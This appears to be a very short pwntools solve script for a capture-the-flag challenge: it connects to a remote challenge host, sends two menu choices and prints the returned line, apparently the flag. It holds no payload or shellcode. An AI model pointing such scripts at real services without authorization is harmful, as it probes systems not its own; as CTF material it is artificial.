from pwn import *

io = remote('flu.xxx', 10010)

io.recvuntil(b'mine\n')
io.sendline(b'6')
io.recvuntil(b':(\n')
io.sendline(b'2')
io.recvline()
print(io.recvline())